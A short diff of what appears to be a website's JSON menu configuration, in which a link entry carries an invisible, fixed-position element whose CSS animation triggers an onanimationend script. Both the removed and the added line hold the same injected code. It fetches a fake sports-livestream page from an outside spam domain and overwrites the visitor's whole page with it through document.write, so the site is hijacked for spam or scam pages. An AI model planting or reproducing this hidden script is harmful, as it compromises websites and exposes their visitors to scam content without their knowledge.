@@ -12,7 +12,7 @@
       "URL": "#",
       "attributes": {
         "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-        "onanimationend": "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; fetch('https://www.borderclick.com/BC/media/poclib_36e722/%e3%80%90LIVESTREAMs!!%e3%80%91%e2%84%a2-Czechia-vs-Spain-Live-Champions-League-12-Nov-2026.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
+        "onanimationend": "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; fetch('lol.directtvhub.shop/philadelphia-eagles-vs-washington-commanders-game-liv-football-fsg617.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
       }
     }
   ]
